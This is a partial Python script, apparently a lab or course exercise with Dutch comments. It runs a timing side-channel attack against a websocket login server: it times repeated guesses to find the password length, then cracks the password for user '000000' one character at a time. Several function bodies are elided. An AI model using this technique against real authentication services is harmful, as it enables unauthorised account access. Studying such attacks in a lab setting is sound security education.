...
async def client_connect(username, password, variance=0.10):
    ...
    for _ in range(10):
        try:
            await ws.send(dumps([username, password, variance]))
            reply = await ws.recv()
            return loads(reply)
        except:
...
async def call_server(username, password, variance=0.001):
    reply = await client_connect(username,password, variance)
    sleep(0.001) 
    return reply


# measure how long it takes for server to reply
async def call_server_timed(username, password, variance=0.001):
...
async def time_guess(username, guess, tries=50, variance=0.001):
    times = []
    for _ in range(tries):
        _, t = await call_server_timed(username, guess, variance)     
        times.append(t)
...
#           next guess = 'huaaaaa'
async def crack_password(username, length, tries=50, variance=0.001):
    found = ""
...
async def main():
    ...
    # 1) length vinden
    length = await find_length("000000", max_len=16, tries=50, variance=0.001)

    # 2) password kraken
    password = await crack_password("000000", length, tries=50, variance=0.001)

    # 3) check
    print("CHECK RESULT:", await call_server("000000", password, 0.001))
